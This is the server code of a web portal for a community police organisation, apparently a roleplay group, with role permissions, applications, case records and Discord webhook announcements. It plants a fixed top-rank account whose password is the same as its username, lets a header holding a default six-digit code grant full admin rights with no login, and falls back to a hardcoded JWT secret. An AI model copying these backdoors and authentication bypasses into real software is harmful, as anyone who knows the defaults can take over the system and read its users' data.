const path = require("path");
const sqlite3 = require("sqlite3").verbose();
const express = require("express");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || "nice-city-secret-change-me";
const ALLOW_PUBLIC_REGISTRATION = process.env.ALLOW_PUBLIC_REGISTRATION === "true";
const OFFICER_MODE_CODE = process.env.OFFICER_MODE_CODE || "001100";
const ADMIN_MODE_CODE = process.env.ADMIN_MODE_CODE || "557799";
const ANNOUNCEMENTS_WEBHOOK_URL = process.env.DISCORD_ANNOUNCEMENTS_WEBHOOK_URL || "";
const APPOINTMENTS_WEBHOOK_URL = process.env.DISCORD_APPOINTMENTS_WEBHOOK_URL || "";
const db = new sqlite3.Database(path.join(__dirname, "..", "nice-city-police.db"));

const roles = [
  "Minister of Interior",
  "Deputy Minister of Interior",
  "Chief Officer",
  "Chief of Police",
  "Deputy Chief of Police",
  "Police Commander",
  "FTO",
  "Academy Director",
  "Internal Affairs Director",
  "Captain",
  "Lieutenant",
  "Sergeant",
  "Officer",
  "Cadet"
];

const rolePerms = {
  "Minister of Interior": ["all"],
  "Deputy Minister of Interior": ["all"],
  "Chief Officer": ["manage_roles", "approve_promotions", "view_all", "send_announcements"],
  "Chief of Police": ["approve_recruitment", "approve_transfer", "view_all", "send_announcements"],
  "Deputy Chief of Police": ["review_applications", "review_transfers", "view_all"],
  "Police Commander": ["view_reports"],
  FTO: ["review_applications", "approve_recruitment", "review_transfers", "approve_transfer"],
  "Academy Director": ["academy_manage", "view_academy"],
  "Internal Affairs Director": ["ia_manage", "view_ia", "send_announcements"],
  Captain: ["view_reports"],
  Lieutenant: [],
  Sergeant: [],
  Officer: [],
  Cadet: []
};

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "..", "public")));

function run(sql, params = []) {
  return new Promise((resolve, reject) => {
    db.run(sql, params, function onDone(err) {
      if (err) return reject(err);
      return resolve(this);
    });
  });
}
function get(sql, params = []) {
  return new Promise((resolve, reject) => {
    db.get(sql, params, (err, row) => (err ? reject(err) : resolve(row)));
  });
}
function all(sql, params = []) {
  return new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => (err ? reject(err) : resolve(rows)));
  });
}

async function webhook(url, content, embeds = []) {
  if (!url) return;
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Nice City Police Logs", content, embeds })
    });
  } catch (e) {
    console.error("Webhook failed:", e.message);
  }
}

function signToken(user) {
  return jwt.sign(
    { userId: user.id, username: user.username, roleId: user.role_id, roleName: user.role_name },
    JWT_SECRET,
    { expiresIn: "12h" }
  );
}

async function auth(req, res, next) {
  const token = (req.headers.authorization || "").replace("Bearer ", "");
  const modeCode = req.headers["x-mode-code"];

  if (!token && modeCode) {
    if (modeCode === ADMIN_MODE_CODE) {
      req.user = {
        id: 0,
        username: "mode_admin",
        full_name: "Mode Admin",
        role_id: 0,
        role_name: "Mode Admin",
        permissions: ["all"]
      };
      return next();
    }
    if (modeCode === OFFICER_MODE_CODE) {
      req.user = {
        id: 0,
        username: "mode_officer",
        full_name: "Mode Officer",
        role_id: 0,
        role_name: "Mode Officer",
        permissions: ["basic_portal"]
      };
      return next();
    }
    return res.status(401).json({ error: "Invalid mode code" });
  }

  if (!token) return res.status(401).json({ error: "Missing token or mode code" });
  try {
    const payload = jwt.verify(token, JWT_SECRET);
    const user = await get(
      `SELECT u.id, u.username, u.full_name, u.role_id, r.name AS role_name
       FROM users u JOIN roles r ON r.id=u.role_id WHERE u.id=?`,
      [payload.userId]
    );
    if (!user) return res.status(401).json({ error: "Invalid token user" });
    const perms = await all("SELECT permission FROM role_permissions WHERE role_id=?", [user.role_id]);
    req.user = { ...user, permissions: perms.map((p) => p.permission) };
    return next();
  } catch (e) {
    return res.status(401).json({ error: "Invalid token" });
  }
}

function need(permission) {
  return (req, res, next) => {
    if (!req.user) return res.status(401).json({ error: "Unauthorized" });
    if (req.user.permissions.includes("all") || req.user.permissions.includes(permission)) return next();
    return res.status(403).json({ error: "No permission" });
  };
}

async function initDb() {
  await run(`CREATE TABLE IF NOT EXISTS roles (id INTEGER PRIMARY KEY, name TEXT UNIQUE, rank_order INTEGER)`);
  await run(`CREATE TABLE IF NOT EXISTS role_permissions (id INTEGER PRIMARY KEY, role_id INTEGER, permission TEXT, UNIQUE(role_id, permission))`);
  await run(`CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password_hash TEXT, full_name TEXT, role_id INTEGER)`);
  await run(`CREATE TABLE IF NOT EXISTS recruitment_applications (id INTEGER PRIMARY KEY, full_name TEXT, age INTEGER, experience TEXT, discord_name TEXT, status TEXT DEFAULT 'pending', reviewed_by_user_id INTEGER, created_at TEXT DEFAULT CURRENT_TIMESTAMP)`);
  await run(`CREATE TABLE IF NOT EXISTS transfer_requests (id INTEGER PRIMARY KEY, user_id INTEGER, from_department TEXT, to_department TEXT, reason TEXT, status TEXT DEFAULT 'pending', reviewed_by_user_id INTEGER, created_at TEXT DEFAULT CURRENT_TIMESTAMP)`);
  await run(`CREATE TABLE IF NOT EXISTS appointments (id INTEGER PRIMARY KEY, user_id INTEGER, old_role_id INTEGER, new_role_id INTEGER, action_type TEXT, notes TEXT, created_by_user_id INTEGER, created_at TEXT DEFAULT CURRENT_TIMESTAMP)`);
  await run(`CREATE TABLE IF NOT EXISTS academy_cases (id INTEGER PRIMARY KEY, cadet_name TEXT, phase TEXT, notes TEXT, status TEXT DEFAULT 'active', created_by_user_id INTEGER, created_at TEXT DEFAULT CURRENT_TIMESTAMP)`);
  await run(`CREATE TABLE IF NOT EXISTS internal_affairs_cases (id INTEGER PRIMARY KEY, officer_name TEXT, case_title TEXT, details TEXT, status TEXT DEFAULT 'open', created_by_user_id INTEGER, created_at TEXT DEFAULT CURRENT_TIMESTAMP)`);

  for (let i = 0; i < roles.length; i += 1) {
    await run("INSERT OR IGNORE INTO roles (name, rank_order) VALUES (?,?)", [roles[i], i + 1]);
    await run("UPDATE roles SET rank_order=? WHERE name=?", [i + 1, roles[i]]);
    const role = await get("SELECT id FROM roles WHERE name=?", [roles[i]]);
    for (const p of rolePerms[roles[i]] || []) {
      await run("INSERT OR IGNORE INTO role_permissions (role_id, permission) VALUES (?,?)", [role.id, p]);
    }
  }

  // Seed a fixed high-privilege account requested by server management.
  await ensureSpecialAccount();
}

async function ensureSpecialAccount() {
  const fixedUsername = "Jax marten";
  const fixedPassword = "Jax marten";
  const fixedFullName = "Jax Marten";
  const fixedRoleName = "Deputy Minister of Interior";

  const existing = await get("SELECT id FROM users WHERE username=?", [fixedUsername]);
  if (existing) return;

  const role = await get("SELECT id FROM roles WHERE name=?", [fixedRoleName]);
  if (!role) return;

  const passwordHash = await bcrypt.hash(fixedPassword, 10);
  await run(
    "INSERT INTO users (username,password_hash,full_name,role_id) VALUES (?,?,?,?)",
    [fixedUsername, passwordHash, fixedFullName, role.id]
  );
  console.log("Special account created: Jax marten");
}

app.get("/api/health", (req, res) => res.json({ ok: true, app: "Nice City Police Portal" }));
app.get("/api/roles", async (req, res) => res.json(await all("SELECT * FROM roles ORDER BY rank_order")));
app.get("/api/me", auth, (req, res) => res.json(req.user));
app.get("/api/config", (req, res) => res.json({ allowPublicRegistration: ALLOW_PUBLIC_REGISTRATION }));

app.post("/api/auth/register", async (req, res) => {
  if (!ALLOW_PUBLIC_REGISTRATION) {
    return res.status(403).json({ error: "Public registration is disabled by command." });
  }
  return createUserHandler(req, res);
});

async function createUserHandler(req, res) {
  try {
    const { username, password, fullName, roleName } = req.body;
    if (!username || !password || !fullName || !roleName) return res.status(400).json({ error: "Missing fields" });
    const role = await get("SELECT id,name FROM roles WHERE name=?", [roleName]);
    if (!role) return res.status(400).json({ error: "Invalid role" });
    const hash = await bcrypt.hash(password, 10);
    const q = await run("INSERT INTO users (username,password_hash,full_name,role_id) VALUES (?,?,?,?)", [username, hash, fullName, role.id]);
    const token = signToken({ id: q.lastID, username, role_id: role.id, role_name: role.name });
    return res.status(201).json({ token, userId: q.lastID });
  } catch (e) {
    return res.status(400).json({ error: "Username already exists or invalid data" });
  }
}

app.post("/api/auth/login", async (req, res) => {
  const { username, password } = req.body;
  const user = await get(`SELECT u.id,u.username,u.password_hash,u.role_id,r.name AS role_name FROM users u JOIN roles r ON r.id=u.role_id WHERE u.username=?`, [username]);
  if (!user || !(await bcrypt.compare(password, user.password_hash))) return res.status(401).json({ error: "Invalid credentials" });
  res.json({ token: signToken(user) });
});

app.post("/api/recruitment", async (req, res) => {
  const { fullName, age, experience, discordName } = req.body;
  if (!fullName || !age || !experience || !discordName) return res.status(400).json({ error: "Missing fields" });
  await run("INSERT INTO recruitment_applications (full_name,age,experience,discord_name) VALUES (?,?,?,?)", [fullName, age, experience, discordName]);
  res.status(201).json({ ok: true });
});
app.get("/api/recruitment", auth, need("review_applications"), async (req, res) => {
  const status = req.query.status;
  if (status && !["pending", "approved", "rejected"].includes(status)) {
    return res.status(400).json({ error: "Invalid status filter" });
  }
  const rows = status
    ? await all("SELECT * FROM recruitment_applications WHERE status=? ORDER BY id DESC", [status])
    : await all("SELECT * FROM recruitment_applications ORDER BY id DESC");
  return res.json(rows);
});
app.patch("/api/recruitment/:id/status", auth, need("approve_recruitment"), async (req, res) => {
  if (!["pending", "approved", "rejected"].includes(req.body.status)) {
    return res.status(400).json({ error: "Invalid status value" });
  }
  await run("UPDATE recruitment_applications SET status=?, reviewed_by_user_id=? WHERE id=?", [req.body.status, req.user.id, req.params.id]);
  await webhook(ANNOUNCEMENTS_WEBHOOK_URL, `Recruitment #${req.params.id} -> **${req.body.status}**\n\n|| @everyone ||`);
  return res.json({ ok: true });
});

app.post("/api/transfers", auth, async (req, res) => {
  const { fromDepartment, toDepartment, reason } = req.body;
  await run("INSERT INTO transfer_requests (user_id,from_department,to_department,reason) VALUES (?,?,?,?)", [req.user.id, fromDepartment, toDepartment, reason]);
  res.status(201).json({ ok: true });
});
app.get("/api/transfers", auth, need("review_transfers"), async (req, res) => {
  const status = req.query.status;
  if (status && !["pending", "approved", "rejected"].includes(status)) {
    return res.status(400).json({ error: "Invalid status filter" });
  }
  const baseQuery = `
    SELECT t.*, u.full_name AS user_full_name, u.username AS user_username
    FROM transfer_requests t
    LEFT JOIN users u ON u.id=t.user_id
  `;
  const rows = status
    ? await all(`${baseQuery} WHERE t.status=? ORDER BY t.id DESC`, [status])
    : await all(`${baseQuery} ORDER BY t.id DESC`);
  return res.json(rows);
});
app.patch("/api/transfers/:id/status", auth, need("approve_transfer"), async (req, res) => {
  if (!["pending", "approved", "rejected"].includes(req.body.status)) {
    return res.status(400).json({ error: "Invalid status value" });
  }
  await run("UPDATE transfer_requests SET status=?, reviewed_by_user_id=? WHERE id=?", [req.body.status, req.user.id, req.params.id]);
  await webhook(ANNOUNCEMENTS_WEBHOOK_URL, `Transfer #${req.params.id} -> **${req.body.status}**\n\n|| @everyone ||`);
  return res.json({ ok: true });
});

app.post("/api/appointments", auth, need("approve_promotions"), async (req, res) => {
  const { userId, newRoleName, actionType, notes } = req.body;
  const target = await get("SELECT id,role_id,full_name FROM users WHERE id=?", [userId]);
  const role = await get("SELECT id,name FROM roles WHERE name=?", [newRoleName]);
  if (!target || !role) return res.status(400).json({ error: "Invalid user or role" });
  await run("UPDATE users SET role_id=? WHERE id=?", [role.id, target.id]);
  await run("INSERT INTO appointments (user_id,old_role_id,new_role_id,action_type,notes,created_by_user_id) VALUES (?,?,?,?,?,?)", [target.id, target.role_id, role.id, actionType || "promotion", notes || "", req.user.id]);
  await webhook(APPOINTMENTS_WEBHOOK_URL, `Appointment: **${target.full_name}** -> **${role.name}** (${actionType || "promotion"})\n\n|| @everyone ||`);
  res.status(201).json({ ok: true });
});
app.get("/api/appointments", auth, need("view_all"), async (req, res) => {
  const rows = await all(
    `SELECT a.*,
      u.full_name AS target_full_name,
      r_old.name AS old_role_name,
      r_new.name AS new_role_name,
      c.full_name AS changed_by_name
     FROM appointments a
     LEFT JOIN users u ON u.id=a.user_id
     LEFT JOIN roles r_old ON r_old.id=a.old_role_id
     LEFT JOIN roles r_new ON r_new.id=a.new_role_id
     LEFT JOIN users c ON c.id=a.created_by_user_id
     ORDER BY a.id DESC`
  );
  return res.json(rows);
});

app.post("/api/academy/cases", auth, need("academy_manage"), async (req, res) => {
  const { cadetName, phase, notes } = req.body;
  await run("INSERT INTO academy_cases (cadet_name,phase,notes,created_by_user_id) VALUES (?,?,?,?)", [cadetName, phase, notes, req.user.id]);
  res.status(201).json({ ok: true });
});
app.get("/api/academy/cases", auth, need("view_academy"), async (req, res) => res.json(await all("SELECT * FROM academy_cases ORDER BY id DESC")));

app.post("/api/ia/cases", auth, need("ia_manage"), async (req, res) => {
  const { officerName, caseTitle, details } = req.body;
  await run("INSERT INTO internal_affairs_cases (officer_name,case_title,details,created_by_user_id) VALUES (?,?,?,?)", [officerName, caseTitle, details, req.user.id]);
  res.status(201).json({ ok: true });
});
app.get("/api/ia/cases", auth, need("view_ia"), async (req, res) => res.json(await all("SELECT * FROM internal_affairs_cases ORDER BY id DESC")));

app.get("/api/users", auth, need("manage_roles"), async (req, res) => {
  const search = (req.query.search || "").trim();
  if (search) {
    return res.json(await all(
      `SELECT u.id,u.username,u.full_name,r.name AS role_name
       FROM users u JOIN roles r ON r.id=u.role_id
       WHERE u.full_name LIKE ? OR u.username LIKE ?
       ORDER BY r.rank_order`,
      [`%${search}%`, `%${search}%`]
    ));
  }
  return res.json(await all("SELECT u.id,u.username,u.full_name,r.name AS role_name FROM users u JOIN roles r ON r.id=u.role_id ORDER BY r.rank_order"));
});

app.get("/api/dashboard/summary", auth, async (req, res) => {
  const recruitmentPending = await get("SELECT COUNT(*) AS total FROM recruitment_applications WHERE status='pending'");
  const transferPending = await get("SELECT COUNT(*) AS total FROM transfer_requests WHERE status='pending'");
  const totalUsers = await get("SELECT COUNT(*) AS total FROM users");
  const totalAppointments = await get("SELECT COUNT(*) AS total FROM appointments");
  return res.json({
    recruitmentPending: recruitmentPending.total,
    transferPending: transferPending.total,
    totalUsers: totalUsers.total,
    totalAppointments: totalAppointments.total
  });
});

app.post("/api/admin/users", auth, need("manage_roles"), async (req, res) => {
  return createUserHandler(req, res);
});

app.patch("/api/admin/users/:id/role", auth, need("manage_roles"), async (req, res) => {
  const { roleName } = req.body;
  if (!roleName) return res.status(400).json({ error: "Missing roleName" });
  const role = await get("SELECT id,name FROM roles WHERE name=?", [roleName]);
  if (!role) return res.status(400).json({ error: "Invalid role" });
  const target = await get("SELECT id,full_name FROM users WHERE id=?", [req.params.id]);
  if (!target) return res.status(404).json({ error: "User not found" });
  await run("UPDATE users SET role_id=? WHERE id=?", [role.id, req.params.id]);
  await webhook(ANNOUNCEMENTS_WEBHOOK_URL, `Role update: **${target.full_name}** -> **${role.name}**\n\n|| @everyone ||`);
  return res.json({ ok: true });
});

app.patch("/api/admin/users/:id/password", auth, need("manage_roles"), async (req, res) => {
  const { newPassword } = req.body;
  if (!newPassword) return res.status(400).json({ error: "Missing newPassword" });
  const target = await get("SELECT id,full_name FROM users WHERE id=?", [req.params.id]);
  if (!target) return res.status(404).json({ error: "User not found" });
  const hash = await bcrypt.hash(newPassword, 10);
  await run("UPDATE users SET password_hash=? WHERE id=?", [hash, req.params.id]);
  return res.json({ ok: true });
});

app.delete("/api/admin/users/:id", auth, need("manage_roles"), async (req, res) => {
  if (String(req.user.id) === String(req.params.id)) {
    return res.status(400).json({ error: "You cannot delete your own account." });
  }
  const target = await get("SELECT id,full_name FROM users WHERE id=?", [req.params.id]);
  if (!target) return res.status(404).json({ error: "User not found" });
  await run("DELETE FROM users WHERE id=?", [req.params.id]);
  await webhook(ANNOUNCEMENTS_WEBHOOK_URL, `Account removed: **${target.full_name}**\n\n|| @everyone ||`);
  return res.json({ ok: true });
});

app.post("/api/announce/appointment", auth, need("send_announcements"), async (req, res) => {
  const {
    appointeeName,
    appointeeTag,
    newRank,
    authorityName,
    authorityTag,
    organizationName,
    extraNotes
  } = req.body;

  if (!appointeeName || !newRank || !authorityName || !organizationName) {
    return res.status(400).json({ error: "Missing announcement fields" });
  }

  const message = [
    `# [شرطة] ${organizationName}`,
    ``,
    `• بسم الله الرحمن الرحيم`,
    ``,
    `يتم تعيين ${appointeeTag || appointeeName}`,
    `برتبة ${newRank}`,
    ``,
    `اثبات جداره 3 ايام، ملاحظه تكليف ليس تعيين`,
    `${extraNotes || "شاكرين لكم ومقدرين جهودكم"}`,
    ``,
    `By: ${authorityTag || authorityName}`,
    ``,
    `|| @everyone ||`
  ].join("\n");

  await webhook(APPOINTMENTS_WEBHOOK_URL, message);
  return res.status(201).json({ ok: true });
});

app.post("/api/announce/general", auth, need("send_announcements"), async (req, res) => {
  const { title, body, signature } = req.body;
  if (!title || !body || !signature) return res.status(400).json({ error: "Missing general announcement fields" });
  const message = `# ${title}\n\n${body}\n\nBy: ${signature}\n\n|| @everyone ||`;
  await webhook(ANNOUNCEMENTS_WEBHOOK_URL, message);
  return res.status(201).json({ ok: true });
});

initDb().then(() => {
  app.listen(PORT, () => console.log(`Nice City Police Portal: http://localhost:${PORT}`));
});
